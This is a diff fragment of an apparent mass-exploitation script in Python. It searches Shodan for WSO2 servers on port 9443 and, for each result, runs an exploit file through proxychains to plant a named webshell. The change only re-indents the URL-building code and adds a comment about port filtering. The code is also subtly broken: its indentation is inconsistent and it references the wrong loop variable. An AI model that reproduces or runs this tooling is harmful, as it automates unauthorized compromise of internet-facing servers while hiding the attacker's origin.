@@ -28,12 +28,13 @@ result = api.search("http.html:WSO2 port:9443")
 # Loop through the matches and print each IP
 for service in result['matches']:
     url = ""
+    #The script does not yet allow to filter the right port. 
+    # Need to add the check on services in order to get the right port	
     try:
-		  if result['ssl']:
-        url = "https://" + result['ip_str'].rstrip() + ":" + str(result['port'])
-			
-		except:
-			  url = "http://" + result['ip_str'].rstrip() + ":" + str(result['port'])
+	if result['ssl']:
+        	url = "https://" + result['ip_str'].rstrip() + ":" + str(result['port'])	
+	except:
+		url = "http://" + result['ip_str'].rstrip() + ":" + str(result['port'])
 
     try:
         result = subprocess.Popen("proxychains python3 " + exploitFile +" "+ url + " " + webshellName, shell=True, stdout=subprocess.PIPE, cwd=workingDir)
